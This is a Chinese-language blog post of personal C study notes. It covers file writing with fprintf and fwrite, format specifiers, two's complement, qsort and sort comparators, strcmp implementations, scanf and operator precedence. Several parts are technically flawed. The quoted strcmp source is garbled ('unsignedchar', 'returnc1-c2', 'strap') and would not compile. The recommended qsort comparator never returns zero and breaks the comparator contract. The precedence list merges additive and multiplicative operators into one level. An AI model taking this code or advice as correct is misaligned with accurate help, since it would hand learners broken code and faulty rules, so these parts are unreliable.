class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">fp = fopen(<span class="string">"lines"</span>, <span class="string">"w"</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//fwrite(&amp;a, 1, 4, fp);</span></span><br><span class="line"><span class="built_in">fprintf</span>(fp, <span class="string">"%d"</span>, a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/image-20200528192200300.png" alt="image-20200528192200300"></p></li><li><p>二进制形式写入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">fp = fopen(<span class="string">"lines"</span>, <span class="string">"wb"</span>); </span><br><span class="line"></span><br><span class="line">fwrite(&amp;a, <span class="number">1</span>, <span class="number">4</span>, fp);</span><br><span class="line"><span class="comment">//fprintf(fp, "%d", a);</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/image-20200528192308515.png" alt="image-20200528192308515"></p></li><li><p>从以上可以很清楚他们的区别。</p></li></ul><hr><h2 id="关于一个格式说明符"><a href="#关于一个格式说明符" class="headerlink" title="关于一个格式说明符"></a>关于一个格式说明符</h2><ul><li>之前由于受到 %02d 类似的表达，不足2位用2填充，超过2位就原样。</li><li>然后了%10s，自己就默认了还是那个意思，其实这里是截断的意思，超过10位的留在缓冲区。</li></ul><hr><h2 id="指针与数组"><a href="#指针与数组" class="headerlink" title="指针与数组"></a>指针与数组</h2><p>以前学习指针时的一个疑问。</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/image-20200427215908475-1591952027801.png" alt="image-20200427215908475"></p><p><strong>因为我们初始化一个数组时,数组的初始值放在rodata段里面.数组对应开辟的空间上的数值存放在栈上,编译器会去访问rodata段上的初始值然后取来初始化局部变量，因此数组的值才能修改. 而指针指向的是rodata段，是不能被修改的</strong></p><hr><h2 id="补码的总结"><a href="#补码的总结" class="headerlink" title="补码的总结"></a>补码的总结</h2><p>对于一个有符号的char型数据。</p><p><strong>有 -1-128 = 127, 127+1 = -128;</strong>, 再结合之前看到的补码和时钟原理很像, 自己总结了下, 可以把这个计算想成是一个圆圈, 以一个字节8位来看, 我们知道范围是 <strong>-128 - 127</strong></p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/image-20200417131746746-1590549170275.png" alt="http://www.bxnop.cn/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200417131746746-1590549170275.png"></p><p>知道一个周期的大小是 <strong>256</strong>. 那么有 <strong>-1+1= 0</strong> 也可以写成 <strong>-1 - 255 = 0</strong>, 相当于 -1 逆时针转了 一圈少1的距离, 那么就是0的位置, 因为如果转了一圈的话, 回到原位置,. 顺时针加法也是一样的原理, <strong>0 + 256 = 0</strong>。</p><hr><h2 id="qsort的比较函数的注意"><a href="#qsort的比较函数的注意" class="headerlink" title="qsort的比较函数的注意"></a>qsort的比较函数的注意</h2><p>qsort的比较函数的返回值是int，这次题目的数据是浮点数，所以如果当两个浮点数相差小于1的时候，返回的值为变成int型的0，那就不会发生排序了。即我用的<code>return q-&gt;price_single - p-&gt;price_single;</code>，当他们2个数相差小于1就返回0，导致结果是不排序。这里正确的写法应该是<code>return q-&gt;price_single &gt; p-&gt;price_single;</code>，以后都写大于小于了。</p><p><strong>2020/8/4</strong> </p><p>今天，从一道题因为比较函数cmp使用不当，导致排序一直出错。进而对C语言的qsort与C++的sort他们的比较函数cmp进行了深究。</p><p>首先说说问题，以前一直在比较函数习惯写<code>retrun a-b</code>这种格式，自从出了上面所述的关于浮点数的比较问题，统一换成了使用<code>return a &gt; b</code>的格式，今天问题来了，这样写一直排序不正确。换了C语言版本又是正确的了。。其实这种<code>return a &gt; b</code>的格式是更高级的写法吧，像gcc编译器都是可以的，但devc与vc6都不行。兼容的写法：<code>*return *(int *)a &gt; *(int *)b ? 1:-1;*</code>，原因后面再叙述。</p><p>学习中又看见C++中sort函数的cmp函数，初步发现它和qsort的cmp函数是相反的写法。。而对于sort的cmp函数只有一种写法：<code>return a &gt; b;</code>(从大到小排序），<code>return a &lt; b;</code>(从小到大排序），它的实质就是<strong>返回值为1表示2个数据不交换，返回值为0表示2个数据交换。</strong>这也就说明也sort的cmp不能写<code>return a-b;</code>的格式。</p><p>最后来说说关于qsort的cmp实质：<strong>返回值为1表示数据需要交换，返回值为-1不需要交换，0表示不确定。</strong>所以qsort的cmp的<code>return a &gt; b</code>就出现了不确定性，只能返回1或0，改进写法就是对它的详细化。</p><p><strong>上面说的也是很乱，最后总结一下：qsort的cmp使用：return <code>*return *(int *)a &gt; *(int *)b ? 1:-1;*</code>（-1与1的先后决定排序方式），sort的cmp使用：<code>return a &gt; b;</code>(从大到小排序），<code>return a &lt; b;</code>(从小到大排序）</strong></p><blockquote><p><strong>至于等于号写不写，看排序需不需要对相等的数排序交换。</strong></p></blockquote><p>最后：sort是qsort的升级，sort还是方便许多。</p><hr><h2 id="关于strcmp函数"><a href="#关于strcmp函数" class="headerlink" title="关于strcmp函数"></a>关于strcmp函数</h2><p>ANSI标准规定，返回值为正数，负数，0 。而<strong>确切数值是依赖不同的C实现的。</strong></p><p>1.当两个字符串不相等时，C标准没有规定返回值会是1 或 -1，只规定了正数和负数。</p><p>2.有些会把两个字符的ASCII码之差作为比较结果由函数值返回。但无论如何不能以此条依据作为程序中的流程逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memcopy.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> strcmp</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(p1,p2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p1;    </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p2;    </span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">const</span> unsignedchar *s1=(<span class="keyword">const</span> unsignedchar*)p1;    </span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">const</span> unsignedchar *s2=(<span class="keyword">const</span> unsignedchar*)p2;    </span><br><span class="line">    <span class="keyword">unsigned</span> reg_charc1,c2;</span><br><span class="line">     <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        c1=(<span class="keyword">unsigned</span> <span class="keyword">char</span>)*s1++;        </span><br><span class="line">        c2=(<span class="keyword">unsigned</span> <span class="keyword">char</span>)*s2++;        </span><br><span class="line">        <span class="keyword">if</span>(c1==<span class="string">'\0'</span>)            </span><br><span class="line">        returnc1-c2;    </span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">while</span>(c1==c2);    </span><br><span class="line">        <span class="keyword">return</span> c1-c2;        </span><br><span class="line">&#125;     </span><br><span class="line">libc_hidden_builtin_def(<span class="built_in">strcmp</span>)</span><br><span class="line"><span class="comment">//以上代码是K&amp;R C规范的,ASCI C的在下面</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*strcmp function*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="keyword">int</span>(strap)(<span class="keyword">const</span> <span class="keyword">char</span> *sl,<span class="keyword">const</span> <span class="keyword">char</span> *s2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*compare unsigned char sl[],s2[]*/</span></span><br><span class="line">    <span class="keyword">for</span>(;*sl==*s2;++sl,++s2)</span><br><span class="line">        <span class="keyword">if</span>(*sl==<span class="string">'\0'</span>)</span><br><span class="line">            <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span>((*(unsignedchar*)sl&lt;*(unsignedchar*)s2)?<span class="number">-1</span>:+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcmp</span>另外的源代码如下：</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *src,<span class="keyword">const</span> <span class="keyword">char</span> *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!(ret = *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)src - *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)dst) &amp;&amp; *dst)</span><br><span class="line">        ++src,++dst;</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">        ret=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(ret&gt;<span class="number">0</span>)</span><br><span class="line">        ret=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span>(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>上面所说的确切数值依赖不同的C实现，刚刚去看了不同C版本的strcmp的源码，果然有的版本确实是返回：1，-1，0。</strong></p><p><strong>所以为了能在不同平台上兼容，以后统一写：&gt;0，==0，&lt;0</strong></p></blockquote><h2 id="关于scanf"><a href="#关于scanf" class="headerlink" title="关于scanf"></a>关于scanf</h2><p>当使用scanf()不是%c的格式化字符串输入时，它不会接受空格与回车。当输入的是空格与回车，它会一直等待用户输入非空格与回车。</p><p>也就是它会跳过空格的意思，空格或回车作为输入结束的标志。</p><p>另外注意：这里只有接受空格，如果不是则跳过这个函数，缓冲区里的值不变。<img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/image-20200806115553020.png" alt="image-20200806115553020"></p><p>最后：当我们前面因为有输入导致缓冲区里有空格或回车时，后面是使用scanf()非<strong>%c</strong>输入，我们是不需要先吃掉回车的，因为scanf()会跳过它。</p><h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><p>百度经验一个文章整理的十分清楚，自己造轮子也没必要，转载一下：<a href="https://jingyan.baidu.com/article/ae97a646c865ccbbfd461dd3.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/ae97a646c865ccbbfd461dd3.html</a></p><ol><li><p>最高级：出现同级别运算符时的结合方向是从左往右（下面级别没写结合顺序时，默认是从左往右）。</p><p>( )圆括号</p><p>[ ]下标运算符号</p><p>-&gt;指向结构体成员运算符</p><p>.结构体成员运算符</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/a48bc2e8904800fc058709bad42043715edb93c4.jpg" alt="C语言运算符优先级大全"></p></li><li><p>第二级：！、~、++、–、-、（类型）、*、&amp;、sizeof。</p><p>这一级都是单目运算符号，这一级的结合方向是从右向左。</p><p>比如出现<em>p++，这时</em>和++同级别，先算右边，再左边。</p><p>所以<em>p++等价于</em>（p++），而不是（*p）++。</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/5e9a2820b93acd895ab5b7bb0335dd8a58de8bc4.jpg" alt="C语言运算符优先级大全"></p></li><li><p>第三级：+、-、*、/、%</p><p>这一级都是算术运算符，结合顺序和数学学习中一致的，先乘除取余数，后加减。</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/d400248ca608a50f128cc13810cec7f88b77ffc4.jpg" alt="C语言运算符优先级大全"></p></li><li><p>第四级：&lt;&lt;、&gt;&gt;</p><p>这是左移、右移运算符，位运算时可能需要用到。</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/5c9c964ce54a2f27689fb9b2e00192dd3240f4c4.jpg" alt="C语言运算符优先级大全"></p></li><li><p>第五级：&lt;、&lt;=、&gt;、&gt;=、！=、==</p><p>这些运算符也称为关系运算符，其中&lt;、&lt;=、&gt;、&gt;=高于！=、==。</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/979906196120a7cdab1e6a4689b375d7987bdcc4.jpg" alt="C语言运算符优先级大全"></p></li><li><p>第六级：&amp;、^、|</p><p>这三个符号也是位运算符号，其中内优先级，&amp;&gt;^&gt;|。</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/50189b40102a04e2ffd2abf62b7aa010bd33c2c4.jpg" alt="C语言运算符优先级大全"></p></li><li><p>第七级：&amp;&amp;、||</p><p>逻辑与&amp;&amp;优先级大于逻辑或||。</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/116b1ae23ea23a42630a31a43733ec3835bbc0c4.jpg" alt="C语言运算符优先级大全"></p></li><li><p>第八级：？  ：</p><p>也称为条件运算符号，是C语言中唯一的一个三目运算符，结合顺序是从右往左。</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/3fe32442a07aa01079437d8cbfbb19efa35f3ec5.jpg" alt="C语言运算符优先级大全"></p></li><li><p>第九级：=、+=、-+、*=、/=、%=</p><p>这些运算符也叫做赋值运算符，除此之外，&gt;&gt;=、&lt;&lt;=、&amp;=、^=、|=这些赋值运算符也在这一级别内，结合顺序是从右往左。</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/a151a233ec3834bbd19f33eb8714c27bd3823dc5.jpg" alt="C语言运算符优先级大全"></p></li><li><p>最低级：，</p><p>逗号运算符也称为顺序求值运算符，在C语言中，运算级别最低。</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/a31e1214c27bd2824bf930f23cb1eef97ebd36c5.jpg" alt="C语言运算符优先级大全"></p></li></ol><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li><p>总的来说，<strong>初级运算符</strong>( )、[ ]、-&gt;、.  高于  <strong>单目运算符</strong>  高于  <strong>算数运算符</strong>（先乘除后加减）  高于  <strong>关系运算符</strong>  高于  <strong>逻辑运算符</strong>（不包括！）  高于  <strong>条件运算符</strong>  高于  <strong>赋值运算符</strong>  高于  <strong>逗号运算符。</strong></p><p><strong>位运算符</strong>的优先级比较分散。</p></li><li><p>除了赋值运算符、条件运算符、单目运算符三类的平级运算符之间的结合顺序是<strong>从右至左</strong>，其他都是从左至右。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> C语言学习 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
